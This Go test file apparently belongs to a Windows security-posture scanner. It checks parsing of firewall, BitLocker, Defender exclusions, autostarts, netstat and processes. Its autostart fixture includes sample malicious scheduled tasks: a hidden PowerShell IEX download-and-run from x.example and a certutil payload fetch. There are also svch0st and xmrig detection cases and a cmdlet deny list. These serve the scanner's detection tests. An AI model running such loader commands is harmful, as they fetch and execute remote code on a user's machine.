package source

import (
	"regexp"
	"strconv"
	"strings"
	"testing"
)

func testEnv(k string) string {
	return map[string]string{
		"USERPROFILE":  `C:\Users\an`,
		"TEMP":         `C:\Users\an\AppData\Local\Temp`,
		"APPDATA":      `C:\Users\an\AppData\Roaming`,
		"LOCALAPPDATA": `C:\Users\an\AppData\Local`,
		"SYSTEMROOT":   `C:\Windows`,
		"WINDIR":       `C:\Windows`,
		"PROGRAMDATA":  `C:\ProgramData`,
	}[strings.ToUpper(k)]
}

// Output of the posture script on a laptop with problems everywhere.
const postureBad = `{"fw":[{"n":"Domain","e":"True"},{"n":"Private","e":"False"},{"n":"Public","e":"False"}],"bl_shell":2,
"rdp_deny":0,"rdp_deny_pol":null,"rdp_nla":0,"rdp_nla_pol":null,"lua":0,"cpba":0,"noau":1,"smb1_cli":2,"smb1_srv":null,
"guest":true,"guest_name":"Gast","ndta_m":145,"ndta_u":null,"noap":0}`

// The same script on a well-kept machine (BitLocker read with admin rights).
const postureGood = "\ufeff" + `{"fw":[{"n":"Domain","e":"True"},{"n":"Private","e":"True"},{"n":"Public","e":"NotConfigured"}],"bl_cim":1,"bl_shell":1,
"rdp_deny":1,"rdp_nla":1,"lua":1,"cpba":5,"noau":null,"smb1_cli":null,"smb1_srv":null,"smb1_cfg":"False",
"guest":false,"guest_name":"Guest","ndta_m":255,"noap":"1"}`

func TestParseWinPosture(t *testing.T) {
	bad, err := parseWinPosture(postureBad)
	if err != nil {
		t.Fatal(err)
	}
	want := Item{
		"os": "windows", "firewall_off_profiles": "Private, Public", "bitlocker": "off",
		"rdp_enabled": true, "rdp_nla": false, "uac_enabled": false, "uac_never_notify": true,
		"updates_disabled_by_policy": true, "smb1": true, "guest_enabled": true, "guest_name": "Gast", "autoplay_off": false,
	}
	for k, v := range want {
		if bad[k] != v {
			t.Errorf("bad %s = %v, want %v", k, bad[k], v)
		}
	}
	good, err := parseWinPosture(postureGood)
	if err != nil {
		t.Fatal(err)
	}
	want = Item{
		"firewall_off_profiles": "", "bitlocker": "on", "rdp_enabled": false, "rdp_nla": true, "uac_enabled": true,
		"uac_never_notify": false, "updates_disabled_by_policy": false, "smb1": false, "guest_enabled": false, "autoplay_off": true,
	}
	for k, v := range want {
		if good[k] != v {
			t.Errorf("good %s = %v, want %v", k, good[k], v)
		}
	}
}

func TestParseWinPostureUnknown(t *testing.T) {
	// A standard user on Windows Home: no firewall cmdlet answer, no
	// BitLocker answer, no Terminal Server values.
	it, err := parseWinPosture(`{"fw":[],"bl_shell":null,"lua":null,"cpba":null}`)
	if err != nil {
		t.Fatal(err)
	}
	for _, k := range []string{"firewall_off_profiles", "bitlocker", "rdp_enabled", "rdp_nla", "guest_enabled"} {
		if _, ok := it[k]; ok {
			t.Errorf("%s set from missing data: %v", k, it[k])
		}
	}
	if it["uac_enabled"] != true {
		t.Error("UAC is on by default")
	}
	// Policy beats the local Remote Desktop switch; suspended BitLocker (5)
	// is not judged.
	it, _ = parseWinPosture(`{"rdp_deny":0,"rdp_deny_pol":1,"bl_shell":5}`)
	if it["rdp_enabled"] != false || it["bitlocker"] != nil {
		t.Errorf("policy or BitLocker: %v", it)
	}
}

// Get-MpComputerStatus / Get-MpPreference as a standard user: exclusions
// are hidden behind an "N/A" message.
func TestParseDefender(t *testing.T) {
	items, err := parseDefender(`{"status":{"mode":"Normal","svc":true,"av":true,"rtp":false,"age":12,"tamper":"False"},
"paths":["N/A: Must be an administrator to view exclusions"],"ext":[],"proc":[],"products":["Windows Defender"]}`, testEnv)
	if err != nil {
		t.Fatal(err)
	}
	if len(items) != 1 {
		t.Fatalf("want only the status item, got %v", items)
	}
	s := items[0]
	if s["active"] != true || s["realtime"] != false || s["signature_age_days"] != 12 || s["tamper_protected"] != false || s["tamper_known"] != true {
		t.Errorf("status: %v", s)
	}

	items, _ = parseDefender(`{"status":{"mode":"Passive Mode","svc":true,"av":true,"rtp":false,"age":0,"tamper":""},
"paths":["C:\\","%USERPROFILE%\\Downloads","C:\\Users\\an\\AppData\\Local\\Temp\\","D:\\src\\big-repo"],"ext":[".exe","log"],"proc":["powershell.exe","C:\\Tools\\build.exe"],
"products":["Windows Defender","Contoso AV"]}`, testEnv)
	if items[0]["active"] != false || items[0]["other_antivirus"] != "Contoso AV" || items[0]["tamper_known"] != false {
		t.Errorf("passive status: %v", items[0])
	}
	reasons := map[string]string{}
	for _, it := range items[1:] {
		reasons[it["value"].(string)] = it["reason"].(string)
		if it["risky"] != (it["reason"] != "") {
			t.Errorf("risky flag: %v", it)
		}
	}
	want := map[string]string{
		`C:\`: "drive", `%USERPROFILE%\Downloads`: "downloads", `C:\Users\an\AppData\Local\Temp\`: "temp", `D:\src\big-repo`: "",
		".exe": "executable_type", "log": "", "powershell.exe": "script_engine", `C:\Tools\build.exe`: "",
	}
	for v, r := range want {
		if got, ok := reasons[v]; !ok || got != r {
			t.Errorf("exclusion %q: reason %q, want %q", v, got, r)
		}
	}
	if items, _ := parseDefender(`{"products":[]}`, testEnv); len(items) != 0 {
		t.Errorf("no Defender: %v", items)
	}
}

func TestRiskyExclusionProfile(t *testing.T) {
	for _, v := range []string{`C:\Users\an`, `%USERPROFILE%`, `C:\Users`, `C:\Users\an\AppData`, `E:`, `*`} {
		if riskyExclusion("path", v, testEnv) == "" {
			t.Errorf("%q should be risky", v)
		}
	}
}

func TestWinProgram(t *testing.T) {
	cases := map[string]string{
		`"C:\Program Files\App\app.exe" --start`:                      `C:\Program Files\App\app.exe`,
		`C:\Program Files\App\app.exe --minimized`:                    `C:\Program Files\App\app.exe`,
		`C:\Users\an\AppData\Local\Discord\Update.exe --processStart`: `C:\Users\an\AppData\Local\Discord\Update.exe`,
		`powershell.exe -NoP -W Hidden -enc SQBFAFgA`:                 `powershell.exe`,
		`rundll32 shell32.dll,Control_RunDLL`:                         `rundll32`,
		`"unterminated`:                                               `unterminated`,
	}
	for in, want := range cases {
		if got := winProgram(in); got != want {
			t.Errorf("winProgram(%q) = %q, want %q", in, got, want)
		}
	}
}

// Captured shape of the autostart script: Run keys, a Startup shortcut and
// scheduled tasks.
const autostarts = `[
{"w":"run_key","l":"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","n":"OneDrive","c":"\"C:\\Users\\an\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background"},
{"w":"run_key","l":"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","n":"Updater","c":"%TEMP%\\upd\\svch0st.exe"},
{"w":"run_key","l":"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","n":"sync","c":"C:\\Users\\an\\AppData\\Roaming\\winsync.exe /q"},
{"w":"startup_folder","l":"C:\\Users\\an\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup","n":"tool.lnk","c":"C:\\Users\\an\\Downloads\\tool.exe"},
{"w":"scheduled_task","l":"\\","n":"GoogleUpdaterTaskUser","c":"C:\\Users\\an\\AppData\\Local\\Google\\GoogleUpdater\\updater.exe --wake"},
{"w":"scheduled_task","l":"\\Sys\\","n":"Health","c":"powershell.exe -NoP -W Hidden -c IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')"},
{"w":"scheduled_task","l":"\\","n":"Cert","c":"%windir%\\system32\\certutil.exe -urlcache -split -f http://x.example/p.exe p.exe"}
]`

func TestParseAutostarts(t *testing.T) {
	items := parseAutostarts(autostarts, testEnv)
	if len(items) != 7 {
		t.Fatalf("want 7 items, got %d", len(items))
	}
	type flags struct{ temp, downloads, root, loader bool }
	want := map[string]flags{
		"OneDrive":              {},
		"Updater":               {temp: true},
		"sync":                  {root: true},
		"tool.lnk":              {downloads: true},
		"GoogleUpdaterTaskUser": {},
		"Health":                {loader: true},
		"Cert":                  {loader: true},
	}
	for _, it := range items {
		w := want[it["name"].(string)]
		got := flags{it["in_temp"].(bool), it["in_downloads"].(bool), it["appdata_root"].(bool), it["script_loader"].(bool)}
		if got != w {
			t.Errorf("%s: got %+v, want %+v (program %s)", it["name"], got, w, it["program"])
		}
		if it["kind"] != "autostart" {
			t.Errorf("kind: %v", it)
		}
	}
	if items[5]["location"] != `Task Scheduler Library\Sys` || items[1]["program"] != `C:\Users\an\AppData\Local\Temp\upd\svch0st.exe` {
		t.Errorf("location/program: %v / %v", items[5]["location"], items[1]["program"])
	}
	// A single entry comes out of ConvertTo-Json as an object.
	if one := parseAutostarts(`{"w":"run_key","l":"HKCU:\\Run","n":"x","c":"C:\\x.exe"}`, testEnv); len(one) != 1 {
		t.Errorf("lone object: %v", one)
	}
}

// netstat -ano on a German Windows: translated header and state column.
const netstatDE = `
Aktive Verbindungen

  Proto  Lokale Adresse         Remoteadresse          Status           PID
  TCP    0.0.0.0:135            0.0.0.0:0              ABHÖREN          1040
  TCP    0.0.0.0:445            0.0.0.0:0              ABHÖREN          4
  TCP    0.0.0.0:3000           0.0.0.0:0              ABHÖREN          8812
  TCP    127.0.0.1:5432         0.0.0.0:0              ABHÖREN          5120
  TCP    192.168.1.20:52144     140.82.112.25:443      HERGESTELLT      9020
  TCP    [::]:3000              [::]:0                 ABHÖREN          8812
  TCP    [::1]:6379             [::]:0                 ABHÖREN          7000
  TCP    [fe80::1%12]:7680      [::]:0                 ABHÖREN          3010
  UDP    0.0.0.0:5353           *:*                                     2210
`

func TestParseNetstat(t *testing.T) {
	ls := parseNetstat(netstatDE)
	if len(ls) != 7 {
		t.Fatalf("want 7 listeners, got %d: %v", len(ls), ls)
	}
	got := map[string]int{}
	for _, l := range ls {
		got[l.host+" "+strconv.Itoa(l.port)] = l.pid
	}
	for k, pid := range map[string]int{"0.0.0.0 3000": 8812, ":: 3000": 8812, "fe80::1 7680": 3010, "::1 6379": 7000, "0.0.0.0 445": 4} {
		if got[k] != pid {
			t.Errorf("%s: pid %d, want %d (%v)", k, got[k], pid, got)
		}
	}
	if !isLoopback("::1") {
		t.Error("::1 is loopback")
	}
}

func TestWinProcesses(t *testing.T) {
	m := parseWinProcesses(`[{"p":4,"n":"System","x":""},{"p":8812,"n":"node.exe","x":"C:\\Users\\an\\AppData\\Local\\Temp\\x\\node.exe"},{"p":0,"n":"Idle","x":""}]`)
	if m[4] != "System" || len(m) != 2 {
		t.Errorf("processes: %v", m)
	}
	it := winProcessItem(8812, m[8812], testEnv)
	if it["from_temp"] != true || it["name"] != "node.exe" {
		t.Errorf("temp process: %v", it)
	}
	it = winProcessItem(1, `C:\USERS\AN\DOWNLOADS\xmrig.exe`, testEnv)
	if it["from_downloads"] != true || it["miner"] != true {
		t.Errorf("downloads miner: %v", it)
	}
	if !winSystemProcess("svchost.exe", `C:\Windows`) || !winSystemProcess(`C:\WINDOWS\System32\svchost.exe`, "") || winSystemProcess(`C:\Program Files\nodejs\node.exe`, `C:\Windows`) {
		t.Error("winSystemProcess")
	}
}

// The scripts must only read: no Set-/New-/Remove- cmdlets, no elevation,
// no network, and no double quotes (they would not survive the command
// line on the way to powershell.exe).
func TestWindowsScriptsReadOnly(t *testing.T) {
	verbs := regexp.MustCompile(`(?i)\b(Set|New-Item|Remove|Add-Mp|Enable|Disable|Start-Process|Stop|Restart|Update|Invoke|Install|Uninstall|Register|Unregister|Clear|Rename|Move|Copy|Out-File|Export|Import-Module)-?\w*`)
	allowed := map[string]bool{"New-Object": true}
	for name, s := range map[string]string{"prelude": psPrelude, "posture": winPostureScript, "defender": winDefenderScript, "autostart": winAutostartScript, "process": winProcessScript} {
		if strings.Contains(s, `"`) {
			t.Errorf("%s script contains a double quote", name)
		}
		for _, m := range verbs.FindAllString(s, -1) {
			if !strings.Contains(m, "-") || allowed[m] {
				continue
			}
			t.Errorf("%s script calls %s", name, m)
		}
		for _, bad := range []string{"RunAs", ".Save(", "http", "Set-Mp", "-Verb", "reg add", "reg delete"} {
			if strings.Contains(s, bad) {
				t.Errorf("%s script contains %q", name, bad)
			}
		}
	}
}
